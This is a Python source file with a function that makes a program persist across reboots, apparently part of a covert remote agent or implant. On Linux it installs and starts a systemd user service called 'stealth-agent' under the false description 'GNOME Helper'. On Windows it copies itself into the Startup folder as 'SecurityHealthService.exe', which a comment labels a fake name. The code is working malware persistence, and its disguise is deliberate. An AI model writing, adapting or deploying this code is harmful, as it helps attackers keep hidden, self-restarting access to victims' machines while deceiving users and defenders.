import platform
import os
import shutil
import subprocess
import sys

def install_persistence(args=None):
    """
    Installs the agent to run on boot.
    """
    # Get the path of the current running executable/script
    current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    
    system = platform.system()
    
    if system == "Linux":
        # Systemd User Service method (Stealthy, no sudo needed)
        service_dir = os.path.expanduser("~/.config/systemd/user/")
        if not os.path.exists(service_dir):
            os.makedirs(service_dir)
            
        service_file = os.path.join(service_dir, "stealth-agent.service")
        
        config = f"""[Unit]
Description=GNOME Helper
After=network.target

[Service]
ExecStart=/usr/bin/python3 {current_exe}
Restart=always

[Install]
WantedBy=default.target
"""
        try:
            with open(service_file, "w") as f:
                f.write(config)
            
            # Enable it
            subprocess.run(["systemctl", "--user", "enable", "stealth-agent"], check=True)
            subprocess.run(["systemctl", "--user", "start", "stealth-agent"], check=True)
            return "✅ Linux Persistence Installed (Systemd User Service)."
        except Exception as e:
            return f"⚠️ Linux Persistence Failed: {e}"

    elif system == "Windows":
        # Startup Folder method
        startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        target_path = os.path.join(startup_dir, "SecurityHealthService.exe") # Fake name
        
        try:
            shutil.copy(current_exe, target_path)
            return "✅ Windows Persistence Installed (Startup Folder)."
        except Exception as e:
            return f"⚠️ Windows Persistence Failed: {e}"
            
    return "⚠️ Unknown OS for persistence."